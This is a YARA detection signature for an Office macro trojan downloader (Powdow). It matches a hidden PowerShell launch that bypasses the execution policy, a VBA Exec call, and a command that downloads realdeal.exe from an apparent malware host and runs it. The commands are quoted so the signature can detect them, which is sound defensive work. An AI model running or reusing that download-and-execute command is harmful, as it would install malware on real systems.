
rule TrojanDownloader_O97M_Powdow_SSA_MTB{
	meta:
		description = "TrojanDownloader:O97M/Powdow.SSA!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 "
		
	strings :
		$a_01_0 = {70 6f 77 65 72 73 68 65 6c 6c 20 2d 57 69 6e 64 6f 77 53 74 79 6c 65 20 68 69 64 64 65 6e 20 2d 65 78 65 63 75 74 69 6f 6e 70 6f 6c 69 63 79 20 62 79 70 61 73 73 3b } //1 powershell -WindowStyle hidden -executionpolicy bypass;
		$a_01_1 = {49 6e 76 6f 6b 65 2d 57 65 62 52 65 71 75 65 73 74 20 2d 55 72 69 20 22 22 68 74 74 70 73 3a 2f 2f 62 61 74 61 75 6e 67 2e 63 6f 2e 7a 61 2f 72 65 61 6c 64 65 61 6c 2e 65 78 65 22 22 20 2d 4f 75 74 46 69 6c 65 20 24 54 65 6d 70 46 69 6c 65 3b 20 53 74 61 72 74 2d 50 72 6f 63 65 73 73 20 24 54 65 6d 70 46 69 6c 65 3b } //1 Invoke-WebRequest -Uri ""https://bataung.co.za/realdeal.exe"" -OutFile $TempFile; Start-Process $TempFile;
		$a_01_2 = {53 65 74 20 5a 76 6f 7a 7a 67 45 78 65 63 20 3d 20 5a 76 6f 7a 7a 67 2e 45 78 65 63 28 58 65 65 61 63 72 63 74 79 29 } //1 Set ZvozzgExec = Zvozzg.Exec(Xeeacrcty)
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1) >=3
 
}